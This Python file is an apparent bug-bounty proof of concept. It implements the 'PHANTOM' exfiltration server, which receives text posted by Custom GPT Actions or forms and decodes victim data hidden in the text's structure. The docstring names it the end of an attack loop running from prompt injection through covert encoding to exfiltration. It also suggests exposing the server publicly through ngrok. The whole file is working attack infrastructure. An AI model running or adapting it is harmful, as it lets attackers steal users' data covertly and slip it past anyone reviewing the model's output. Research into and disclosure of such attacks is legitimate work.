#!/usr/bin/env python3
"""
PHANTOM Exfiltration Server — Receives and Decodes Encoded Data

Minimal HTTP server that:
1. Accepts POST requests from Custom GPT Actions or form submissions
2. Decodes PHANTOM structural encoding from the received text
3. Logs decoded data in real-time

This completes the attack loop: injection → encoding → exfiltration → decoding.
The attacker runs this server and watches decoded victim data arrive automatically.

Usage:
  # Start the server
  python experiments/bounty_poc/exfil_server.py --port 8888

  # Start with specific model decoder
  python experiments/bounty_poc/exfil_server.py --port 8888 --model gpt-4o

  # Use with ngrok for public endpoint (for Custom GPT Actions)
  # In another terminal: ngrok http 8888
  python experiments/bounty_poc/exfil_server.py --port 8888 --model gpt-4o
"""

import argparse
import json
import os
import sys
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs, urlparse

# Local imports
sys.path.insert(0, str(Path(__file__).parent))
sys.path.insert(0, str(Path(__file__).parent.parent))

from combined_decoder import MultiChannelDecoder
from channel_directives import get_model_profile


class PhantomDecoder:
    """Wrapper that decodes PHANTOM structural encoding from text."""

    def __init__(self, model_hint: str = "gpt-4o"):
        profile = get_model_profile(model_hint)
        self.decoder = MultiChannelDecoder(
            model_hint=model_hint,
            include_cotse=bool(profile.get("cotse_channels")),
            use_hamming=profile.get("use_hamming", False),
        )
        self.model = model_hint
        self.log_entries = []

    def decode_text(self, text: str) -> dict:
        """Decode PHANTOM channels from text and return results."""
        result = self.decoder.decode(text)
        decoded_bits = {
            ch: r.decoded_bit for ch, r in result.channel_results.items()
        }
        confidences = {
            ch: r.confidence for ch, r in result.channel_results.items()
        }

        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "model": self.model,
            "decoded_bits": decoded_bits,
            "confidences": confidences,
            "raw_bits": result.raw_bits,
            "recovered_payload": result.recovered_payload,
            "recovered_hex": result.recovered_bytes.hex() if result.recovered_bytes else None,
            "mean_confidence": result.mean_confidence,
            "text_length": len(text),
            "text_preview": text[:200],
        }
        self.log_entries.append(entry)
        return entry


# Global decoder instance (set in main)
phantom_decoder: Optional[PhantomDecoder] = None
log_file: Optional[str] = None


class ExfilHandler(BaseHTTPRequestHandler):
    """HTTP handler that receives and decodes PHANTOM-encoded text."""

    def _send_response(self, status: int, body: dict):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        self.wfile.write(json.dumps(body, indent=2).encode("utf-8"))

    def do_OPTIONS(self):
        """Handle CORS preflight."""
        self._send_response(200, {"status": "ok"})

    def do_GET(self):
        """Health check and log viewer."""
        parsed = urlparse(self.path)

        if parsed.path == "/":
            self._send_response(200, {
                "status": "PHANTOM Exfil Server running",
                "model": phantom_decoder.model if phantom_decoder else "none",
                "entries_received": len(phantom_decoder.log_entries) if phantom_decoder else 0,
                "endpoints": {
                    "POST /collect": "Submit text for decoding (body: {text: '...'})",
                    "POST /form": "Form submission endpoint (form field: 'response')",
                    "GET /log": "View decoded entries",
                    "GET /": "This status page",
                },
            })
        elif parsed.path == "/log":
            entries = phantom_decoder.log_entries if phantom_decoder else []
            self._send_response(200, {
                "total_entries": len(entries),
                "entries": entries[-50:],  # Last 50 entries
            })
        else:
            self._send_response(404, {"error": "Not found"})

    def do_POST(self):
        """Receive encoded text and decode it."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        parsed = urlparse(self.path)
        text = ""

        if parsed.path in ("/collect", "/form", "/webhook"):
            content_type = self.headers.get("Content-Type", "")

            if "application/json" in content_type:
                try:
                    data = json.loads(body)
                    # Accept text in various field names
                    text = (data.get("text") or data.get("response") or
                            data.get("content") or data.get("message") or
                            data.get("summary") or "")
                except json.JSONDecodeError:
                    text = body

            elif "application/x-www-form-urlencoded" in content_type:
                params = parse_qs(body)
                text = (params.get("response", [""])[0] or
                        params.get("text", [""])[0] or
                        params.get("content", [""])[0])

            else:
                # Treat raw body as text
                text = body

            if text and phantom_decoder:
                entry = phantom_decoder.decode_text(text)

                # Print decoded data in real-time
                print(f"\n{'='*60}")
                print(f"  DECODED EXFILTRATION #{len(phantom_decoder.log_entries)}")
                print(f"  Time: {entry['timestamp']}")
                print(f"  Text length: {entry['text_length']} chars")
                print(f"  Bits: {entry['decoded_bits']}")
                print(f"  Recovered: {entry['recovered_payload']!r}")
                print(f"  Confidence: {entry['mean_confidence']:.2f}")
                print(f"  Preview: {entry['text_preview'][:100]}...")
                print(f"{'='*60}")

                # Append to log file
                if log_file:
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write(json.dumps(entry) + "\n")

                self._send_response(200, {
                    "status": "decoded",
                    "decoded_bits": entry["decoded_bits"],
                    "recovered": entry["recovered_payload"],
                    "confidence": entry["mean_confidence"],
                })
            else:
                self._send_response(400, {"error": "No text provided"})
        else:
            self._send_response(404, {"error": "Use POST /collect or /form"})

    def log_message(self, format, *args):
        """Suppress default access logs — we print our own."""
        pass


def main():
    parser = argparse.ArgumentParser(
        description="PHANTOM Exfiltration Server"
    )
    parser.add_argument("--port", type=int, default=8888,
                        help="Port to listen on (default: 8888)")
    parser.add_argument("--model", default="gpt-4o",
                        help="Model decoder to use (default: gpt-4o)")
    parser.add_argument("--log", default=None,
                        help="Log file path (JSONL format)")

    args = parser.parse_args()

    global phantom_decoder, log_file
    phantom_decoder = PhantomDecoder(model_hint=args.model)
    log_file = args.log

    if log_file is None:
        output_dir = str(Path(__file__).parent.parent / "results")
        os.makedirs(output_dir, exist_ok=True)
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        log_file = os.path.join(output_dir, f"exfil_log_{ts}.jsonl")

    print(f"PHANTOM Exfiltration Server")
    print(f"  Port: {args.port}")
    print(f"  Model decoder: {args.model}")
    print(f"  Log file: {log_file}")
    print(f"  Endpoints:")
    print(f"    POST /collect  — JSON body: {{\"text\": \"...\"}}")
    print(f"    POST /form     — Form field: response=...")
    print(f"    POST /webhook  — Custom GPT Action callback")
    print(f"    GET  /log      — View decoded entries")
    print(f"    GET  /         — Status")
    print(f"\n  For public access: ngrok http {args.port}")
    print(f"\n  Listening...")

    server = HTTPServer(("0.0.0.0", args.port), ExfilHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\nShutting down. {len(phantom_decoder.log_entries)} entries logged to {log_file}")
        server.server_close()


if __name__ == "__main__":
    main()
